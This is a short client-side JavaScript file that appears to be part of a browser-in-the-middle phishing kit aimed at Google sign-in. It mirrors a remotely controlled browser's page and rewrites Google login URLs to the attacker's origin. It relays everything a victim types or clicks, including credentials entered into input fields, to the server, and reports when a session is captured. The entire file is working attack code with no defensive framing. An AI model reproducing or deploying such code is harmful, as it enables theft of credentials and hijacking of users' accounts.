/* eslint-disable */
(function () {
  const mirror = document.getElementById('mirror');
  const bar = document.getElementById('bar');
  const socket = io();

  function rewriteHtml(html) {
    return html
      .replace(/https?:\/\/accounts\.google\.com/gi, window.location.origin)
      .replace(/https?:\/\/www\.google\.com/gi, window.location.origin);
  }

  socket.on('snapshot', ({ html, url }) => {
    mirror.innerHTML = rewriteHtml(html);
    if (url) bar.textContent = 'Puppet mirror · ' + url;
    bindMirrorEvents();
  });

  socket.on('browserUrl', ({ url }) => {
    if (url) history.replaceState(null, '', url);
  });

  socket.on('redirect', ({ url }) => {
    window.location.href = url;
  });

  socket.on('captured', () => {
    bar.textContent = 'Session captured — redirecting…';
  });

  socket.on('error', ({ message }) => {
    mirror.innerHTML = '<div class="err">' + message + '</div>';
  });

  function bindMirrorEvents() {
    mirror.querySelectorAll('input, textarea').forEach((el) => {
      el.addEventListener('input', () => {
        socket.emit('action', { type: 'type', selector: cssPath(el), text: el.value });
      });
      el.addEventListener('keydown', (e) => {
        if (e.key === 'Enter') socket.emit('action', { type: 'key', key: 'Enter' });
      });
    });

    mirror.querySelectorAll('button, a, [role="button"], input[type="submit"]').forEach((el) => {
      el.addEventListener('click', (e) => {
        e.preventDefault();
        socket.emit('action', { type: 'click', selector: cssPath(el) });
      });
    });
  }

  function cssPath(el) {
    if (el.id) return '#' + CSS.escape(el.id);
    const parts = [];
    while (el && el.nodeType === 1 && parts.length < 6) {
      let part = el.tagName.toLowerCase();
      if (el.name) part += '[name="' + el.name + '"]';
      else if (el.type) part += '[type="' + el.type + '"]';
      parts.unshift(part);
      el = el.parentElement;
    }
    return parts.join(' > ');
  }
})();
